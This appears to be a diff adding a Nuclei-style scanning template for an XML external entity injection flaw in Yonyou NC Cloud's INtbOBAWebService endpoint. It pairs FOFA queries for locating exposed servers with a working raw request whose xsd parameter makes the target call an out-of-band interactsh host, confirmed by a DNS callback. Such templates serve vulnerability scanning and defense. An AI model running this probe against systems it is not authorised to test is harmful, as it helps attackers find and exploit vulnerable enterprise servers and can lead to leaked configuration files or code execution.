@@ -1,0 +1,28 @@
+id: yonyou-nc-cloud-xxe
+info:
+  name: "用友 NC Cloud nc.itf.tb.oba.INtbOBAWebService 接口 XML 实体注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="/Client/Uclient/UClient.exe"||body="ufida.ico"||body="nccloud"||body="/api/uclient/public/"
+          用友NC Cloud作为企业级云原生数字化平台，提供财务共享、智能制造等18项解决方案。其/uapws/service/nc.itf.tb.oba.INtbOBAWebService接口在XML实体解析过程中未正确限制外部实体引用，攻击者可通过构造恶意XML实体实现敏感数据提取或服务器状态操控。该漏洞源于对用户提交XML数据的校验机制缺失，可能造成系统配置文件泄露或远程代码执行风险。
+  tags: 用友NC
+http:
+- raw:
+  - |
+    GET /uapws/service/nc.itf.tb.oba.INtbOBAWebService?xsd=http://{{interactsh-url}}/win2.xml HTTP/1.1
+    Host: {{Hostname}}
+    Connection: close
+    Accept: text/plain, */*; q=0.01
+    Cache-Control: no-cache
+    Pragma: no-cache
+    Accept-Encoding: gzip
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 500
+  - type: word
+    part: interactsh_protocol
+    words:
+    - "dns"
